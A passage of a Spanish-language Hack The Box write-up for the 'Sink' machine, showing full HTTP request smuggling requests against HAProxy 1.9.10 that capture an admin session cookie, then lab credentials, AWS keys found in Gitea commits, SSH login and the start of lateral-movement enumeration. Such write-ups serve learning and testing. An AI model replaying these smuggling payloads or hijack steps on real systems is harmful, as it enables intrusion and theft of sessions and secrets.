  &lt;p&gt;Tomada de &lt;a href=&quot;https://portswigger.net/web-security/request-smuggling&quot;&gt;What is HTTP request smuggling? - portswigger&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Ahora s√≠, sigamos y probemos si nuestra versi√≥n es vulnerable a &lt;code&gt;HTTP Request Smuggling&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Siguiendo algunos ejemplos de referencias anteriores y de &lt;a href=&quot;https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142&quot;&gt;este art√≠culo&lt;/a&gt;, logramos obtener la versi√≥n de &lt;code&gt;HAProxy&lt;/code&gt; que esta usando el servidor:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142&quot;&gt;The Powerfull HTTP Request Smuggling - medium.com/ricardoiramar&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si enviamos la siguiente petici√≥n:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_versionHAProxy.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Enviamos la data en formato &lt;code&gt;chunked&lt;/code&gt; (separada por &lt;code&gt;\n&lt;/code&gt; (newline)).&lt;/li&gt;
  &lt;li&gt;El total de la traza serian &lt;code&gt;9&lt;/code&gt; caracteres (&lt;code&gt;note=hola&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;Con &lt;code&gt;0&lt;/code&gt; le indicamos el final de la data en formato &lt;code&gt;chunk&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obtenemos la versi√≥n concreta de &lt;strong&gt;HAProxy&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_res_versionHAProxy.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;HAProxy Version 1.9.10&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Bueno, pues podemos enfocarnos un poco m√°s. Quiz√°s esta sea la ruta adecuada para la explotaci√≥n. Sigamos validando si podemos explotar la web mediante el smuggling‚Ä¶&lt;/p&gt;

&lt;p&gt;En las referencias del CVE, encontramos este &lt;strong&gt;PoC&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://nathandavison.com/blog/haproxy-http-request-smuggling&quot;&gt;HAProxy HTTP Request Smuggling&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;D√°ndole unas vueltas nos indica algo necesario para la correcta explotaci√≥n:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The backend must also support HTTP &lt;u&gt;keep-alive&lt;/u&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As√≠ que debemos cambiar el &lt;strong&gt;header&lt;/strong&gt; &lt;code&gt;Connection: close&lt;/code&gt; a &lt;code&gt;Connection: keep-alive&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;D√©mosle a la locura, modifiquemos la petici√≥n incrustando otra solicitud a ver que recibimos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;POST /notes HTTP/1.1
Host: 10.10.10.225:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 259                                               &amp;lt;!-- original --&amp;gt;
Origin: http://10.10.10.225:5000
DNT: 1
Connection: keep-alive
Referer: http://10.10.10.225:5000/notes
Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Transfer-Encoding: chunked

9
note=hola
0

POST /notes HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded                   &amp;lt;!-- smuggling --&amp;gt;
Content-Length: 251
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8

note=holas
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_newPOST101010225.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y validamos el apartado &lt;code&gt;/notes&lt;/code&gt;, tenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes_res_newPOST101010225.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nada :P üòÇ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;final_vuln&quot;&gt;Logramos la explotaci√≥n del &lt;u&gt;HTTP Request Smuggling&lt;/u&gt; &lt;a href=&quot;#final_vuln&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Revisando de nuevo el post, nos dice que &lt;u&gt;muchas veces el &lt;/u&gt;&lt;code&gt;chunked&lt;/code&gt;&lt;u&gt; no es tomado y debemos agregarle al inicio de ese header la cadena &lt;/u&gt;&lt;code&gt;\x0b&lt;/code&gt;&lt;u&gt; (hexadecimal) &lt;/u&gt;&lt;strong&gt;&lt;u&gt;para que lo interprete&lt;/u&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Despu√©s de jugar con √©l, intentando agregarlo a la petici√≥n, obten√≠amos lo mismo. Peeeeeeero era porque lo estaba haciendo mal.&lt;/p&gt;

&lt;p&gt;Si pasamos el valor hexadecimal a &lt;strong&gt;base64&lt;/strong&gt; externamente (nosotros mismos) y despu√©s en &lt;strong&gt;Burp&lt;/strong&gt; usamos el convertidor interno de &lt;strong&gt;base64&lt;/strong&gt; al valor original, ah√≠ si logramos ver el &lt;code&gt;\x0b&lt;/code&gt; reflejado:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Pasar &lt;code&gt;0b&lt;/code&gt; a &lt;strong&gt;base64&lt;/strong&gt;: &lt;code&gt;Cw==&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Pegar &lt;code&gt;Cw==&lt;/code&gt; en la petici√≥n, seleccionarlo y decodearlo de &lt;strong&gt;base64&lt;/strong&gt; a valor original:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_newPOST101010225_0b_1.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seleccionamos la cadena &lt;code&gt;Cw==&lt;/code&gt; y hacemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Clic derecho &amp;gt; Convert-Selection &amp;gt; Base64 &amp;gt; Base64-decode (o de la forma corta: CTRL + SHIFT + B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_notes_req_newPOST101010225_0b_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;POST /notes HTTP/1.1
Host: 10.10.10.225:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded                        &amp;lt;!-- original --&amp;gt;
Content-Length: 259
Origin: http://10.10.10.225:5000
DNT: 1
Connection: keep-alive
Referer: http://10.10.10.225:5000/notes
Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Transfer-Encoding:chunked

9
note=hola
0

POST /notes HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded                        &amp;lt;!-- smuggling --&amp;gt;
Content-Length: 251
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDUzCA.YVpcMp8dXmocfLzRQa8HEFDUp_8

note=holas
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, validemos si cambia algo ahora‚Ä¶&lt;/p&gt;

&lt;p&gt;Nos genera dos notas, una esta vac√≠a y la otra llenita :P Veamos la llenita claramente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes_res_newPOST101010225_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vale vale valeeeeeeeeeee, que es esta locuraaaaaaaaaaaa‚Ä¶ Tenemos una nueva &lt;code&gt;cookie&lt;/code&gt; de alg√∫n usuario (o pues al menos es diferente a la nuestra) corriendo el servicio sobre el &lt;code&gt;localhost&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Viendo lo que tenemos podemos intuir que esta pasando:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(Esto puede sonar enrredado (supongo) pero es lo que entiendo que paso)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;üö® &lt;strong&gt;&lt;em&gt;Normalmente (como vimos en las explicaciones anteriores) queremos ingresar a alg√∫n recurso al que no tengamos acceso. Como en este caso no sabemos a cu√°l, lo lanzamos contra el mismo recurso. Vemos que se efect√∫a nuestro intento, logrando as√≠ &lt;u&gt;interceptar la otra petici√≥n, pero obteniendo la respuesta en el mismo recurso que usamos para enviarla&lt;/u&gt; (o sea, en &lt;code&gt;/notes&lt;/code&gt;)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;La petici√≥n es un &lt;code&gt;delete&lt;/code&gt; a la nota &lt;strong&gt;1234&lt;/strong&gt; (&lt;code&gt;/notes/delete/1234&lt;/code&gt;) pero ejecutada desde el &lt;code&gt;localhost&lt;/code&gt; por el puerto &lt;code&gt;8080&lt;/code&gt; y claramente por un usuario interno, lo sabemos por qu√© obtenemos una &lt;code&gt;Cookie&lt;/code&gt; distinta a la nuestra. Podemos usarla para cambiar la que tenemos por esa, recargar la p√°gina y ver con quien estamos (si es que cambiamos a otro usuario)‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;GET /notes/delete/1234 HTTP/1.1
Host: 127.0.0.1:8080 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YDSQAA._g
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero si notamos el tama√±o de la &lt;code&gt;cookie&lt;/code&gt; es m√°s corto (la comparamos con la nuestra), agregu√©mosle m√°s buffer, simplemente cambiando el valor de la cabecera a &lt;code&gt;Content-Length: 250&lt;/code&gt; por ejemplo y veamos la respuesta ahora:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(Justo ac√° reiniciaron la m√°quina, pero pues lo unico que cambiaran seran las cookies, tanto la mia como la que obtengamos)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;La respuesta que tenemos en la nueva nota es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Nada ._ .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ponemos m√°s de &lt;strong&gt;308&lt;/strong&gt; como tama√±o volvemos a obtener solo una nota, entonces podemos borrar el contenido de &lt;code&gt;note=&lt;/code&gt; (para liberar espacio) y coloquemos &lt;code&gt;Content-Length: 303&lt;/code&gt; (despu√©s de alg√∫n tanteo):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;POST /notes HTTP/1.1
Host: 10.10.10.225:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 254
Origin: http://10.10.10.225:5000
DNT: 1
Connection: keep-alive
Referer: http://10.10.10.225:5000/notes
Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDWNyg.naJPYMmG6_8HKfdGqeeJMTwjVR4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Transfer-Encoding:chunked

9
note=hola
0

POST /notes HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ.YDWNyg.naJPYMmG6_8HKfdGqeeJMTwjVR4

note=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y obtenemos ahora si en la nota:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;GET /notes/delete/1234 HTTP/1.1 
Host: 127.0.0.1:8080 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 
Accept-Encoding: gzip, deflate 
Accept: */* 
Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.YDWL9A.dG5uqF6Y8oZfi7uQi3IATStQVIA 
X-Forwarded-For: 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, ahora si es del tama√±o adecuado :)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(Volvieron a reiniciar la m√°quinaüòê)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Tomemos la cookie. Yo usare la extensi√≥n de Firefox llamada &lt;code&gt;Cookie-Editor&lt;/code&gt; (que nos permite jugar con las cookies claramente :P)&lt;/p&gt;

&lt;p&gt;A√±adimos una nueva cookie, le ponemos de nombre &lt;code&gt;session&lt;/code&gt; y pegamos la cookie que encontramos y damos clic en guardar (&lt;code&gt;add&lt;/code&gt;). Ahora simplemente recargamos la p√°gina y estar√≠amos dentro como el usuario &lt;code&gt;admin@sink.htb&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_changed_cookie_adminSINKhtb.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313google_gif_kidperfect.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 60%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;web-notes&quot;&gt;Encontramos cositas siendo el usuario &lt;u&gt;admin&lt;/u&gt; &lt;a href=&quot;#web-notes&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si revisamos las notas tenemos 3:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_admin_notes.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El contenido de cada una es el siguiente:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Note (1):

Chef Login : http://chef.sink.htb Username : chefadm Password : /G'FEGc&amp;amp;zEx{4]zz
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Note (2):

Dev Node URL : http://code.sink.htb Username : root Password : FaH@3I&amp;gt;ZB})zzfO3
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Note (3):

Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : gB&amp;gt;HGGK\{*L.f83C
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, tenemos 3 nuevas URL (una aparentemente con certificado SSL), con sus respectivos usuarios y contrase√±as‚Ä¶ Agregu√©moslas al &lt;code&gt;/etc/hosts&lt;/code&gt; e inspeccionemos‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat /etc/hosts
...
10.10.10.225  chef.sink.htb code.sink.htb nagios.sink.htb
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero al colocarlos en la web, ninguno redirecciona a ning√∫n sitio. Y pues tiene sentido, no sabemos en qu√© puerto est√°n corriendo por lo tanto no encuentra realmente lo que tiene que resolver‚Ä¶ Pero pues tenemos credenciales y si recordamos, hay un servicio sobre el puerto &lt;code&gt;3000&lt;/code&gt; (&lt;strong&gt;Gitea&lt;/strong&gt;) con panel login (y en el cual uno de los usuarios era &lt;code&gt;root&lt;/code&gt;), intentemos usar la contrase√±a que tenemos de &lt;code&gt;root&lt;/code&gt; sobre ese login:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_login.png&quot; alt=&quot;313page3000_root_login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yyyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_login_done.png&quot; alt=&quot;313page3000_root_login_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfecto, tamos dentro, ahoraaaaaaaaaaaaaaaaaaa a enumerar :P&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;gitea-root&quot;&gt;Enumeramos el servicio &lt;u&gt;Gitea&lt;/u&gt; como el usuario &lt;u&gt;root&lt;/u&gt; &lt;a href=&quot;#gitea-root&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Nos encontramos con &lt;strong&gt;4&lt;/strong&gt; repositorios (aunque solo se vean 3 en la imagen hay &lt;strong&gt;4&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repos.png&quot; alt=&quot;313page3000_root_repos&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;'root' created repository 'root/Key_Management'
2 months ago
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;O sea que tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Repositorios:

* Log_Management.
* Key_Management.
* Serverless-Plugin.
* Kinesis_ElasticSearch.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Revisando cada uno, sus respectivos commits y contenido encontramos esto:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El usuario &lt;code&gt;marcus&lt;/code&gt; &lt;u&gt;es el que hace los push (sube los cambios)&lt;/u&gt;, &lt;code&gt;root&lt;/code&gt; simplemente crea los repos.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Cositas relevantes de cada repo&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;-log_management-commits&quot;&gt;ü™ï Log_Management (commits)&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_logMan_commits.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si entramos en ese commit, tenemos el &lt;code&gt;access key ID&lt;/code&gt; y la &lt;code&gt;secret access key&lt;/code&gt; de &lt;code&gt;AWS&lt;/code&gt; (Amazon Web Services):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
require 'vendor/autoload.php';

use Aws\CloudWatchLogs\CloudWatchLogsClient;
use Aws\Exception\AwsException;

$client = new CloudWatchLogsClient([
        'region' =&amp;gt; 'eu',
        'endpoint' =&amp;gt; 'http://127.0.0.1:4566',
        'credentials' =&amp;gt; [
                'key' =&amp;gt; 'AKIAIUEN3QWCPSTEITJQ',
                'secret' =&amp;gt; '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'
        ],
        'version' =&amp;gt; 'latest'
]);
try {
$client-&amp;gt;createLogGroup(array(
        'logGroupName' =&amp;gt; 'Chef_Events',
));
}
catch (AwsException $e) {
    echo $e-&amp;gt;getMessage();
    echo &quot;\n&quot;;
}
try {
$client-&amp;gt;createLogStream([
        'logGroupName' =&amp;gt; 'Chef_Events',
        'logStreamName' =&amp;gt; '20201120'
]);
}catch (AwsException $e) {
    echo $e-&amp;gt;getMessage();
    echo &quot;\n&quot;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos tenerlo en cuenta (adem√°s del puerto &lt;code&gt;4566&lt;/code&gt; sobre el `lo), ya que en el siguiente commit esos valores son remplazados:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_logMan_commit_prepProd.png&quot; alt=&quot;313page3000_root_repo_logMan_commit_prepProd&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;-key_management-commits&quot;&gt;ü™ï Key_Management (commits)&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_keyMan_commits.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora entremos en ese commit en concreto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_keyMan_keyfound.png&quot; alt=&quot;313page3000_root_repo_keyMan_keyfound&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos encontramos con la &lt;strong&gt;llave privada&lt;/strong&gt; de un usuario (posiblemente de &lt;code&gt;marcus&lt;/code&gt;) guardada en el archivo &lt;code&gt;.keys/dev_keys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En el mismo commit vemos como usa la llave mediante el objeto &lt;code&gt;ec2.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php

require 'vendor/autoload.php';
use Aws\Ec2\Ec2Client;

$ec2Client = new Aws\Ec2\Ec2Client([
    'region' =&amp;gt; 'eu',
    'version' =&amp;gt; '2020-12-21',
    'profile' =&amp;gt; 'default',
    'endpoint' =&amp;gt; 'http://127.0.0.1:4566'
]);

$keyPairName = 'dev_keys';

$result = $ec2Client-&amp;gt;createKeyPair(array(
    'KeyName' =&amp;gt; $keyPairName
));

// Save the private key
$saveKeyLocation = getenv('HOME') . &quot;.keys/{$keyPairName}&quot;;
file_put_contents($saveKeyLocation, $result['keyMaterial']);

// Update the key's permissions so it can be used with SSH
chmod($saveKeyLocation, 0600);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y para pasar a producci√≥n cambian el archivo &lt;code&gt;dev_keys&lt;/code&gt; por &lt;code&gt;prod_keys&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_root_repo_keyMan_keychanged.png&quot; alt=&quot;313page3000_root_repo_keyMan_keychanged&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Bueno, pues probemos a copiarnos esa key, pasarla a un archivo, darle los permisos necesarios (&lt;code&gt;chmod 600 &amp;lt;file&amp;gt;&lt;/code&gt;) e intentar acceder mediante &lt;code&gt;SSH&lt;/code&gt; con alguno de los usuarios, inicialmente con &lt;code&gt;marcus&lt;/code&gt; que fue el que hizo el push:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;En los dem√°s repos no encontre nada realmente relevante :s&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ chmod 600 dev_keys 
‚ù≠ ssh marcus@10.10.10.225 -i dev_keys 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-53-generic x86_64)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyyyy estamos dentroooooooooooooooooo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ id
uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
marcus@sink:~$ ls
user.txt
marcus@sink:~$ ls /home
david  git  marcus
marcus@sink:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Niceeeeeeeeeeeeeeeeeee. LOCO LOCOOOOOOOOOOOOOOo lo del &lt;strong&gt;smuggling&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Ahora si, quien sabe que nos espere :o&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;movimiento-lateral&quot;&gt;AWS Secrets: &lt;u&gt;marcus&lt;/u&gt; -&amp;gt; &lt;u&gt;david&lt;/u&gt; &lt;a href=&quot;#movimiento-lateral&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Si enumeramos servicios recordamos al puerto que hab√≠amos visto antes, el &lt;code&gt;4566&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11          0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-1        0.0.0.0:*               LISTEN
tcp        0      0 localhost:34833         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-2        0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-3        0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-4        0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-5        0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-6        0.0.0.0:*               LISTEN
tcp        0      0 localhost:4566          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:x11-7        0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN
tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Adem√°s de muchos otros pero sobre una IP diferente que me recordo a &lt;code&gt;Docker&lt;/code&gt;, enumeremos el servicio &lt;code&gt;docker&lt;/code&gt; a ver que encontramos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ systemctl status docker
‚óè docker.service - Docker Application Container Engine
     Loaded: loaded (/lib/systemd/system/docker.service; disabled; vendor preset: enabled)
     Active: active (running) since Wed 2021-02-24 25:25:25 UTC; 25h ago
TriggeredBy: ‚óè docker.socket
       Docs: https://docs.docker.com
   Main PID: 1487 (dockerd)
      Tasks: 147
     Memory: 150.5M
     CGroup: /system.slice/docker.service
             ‚îú‚îÄ1487 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
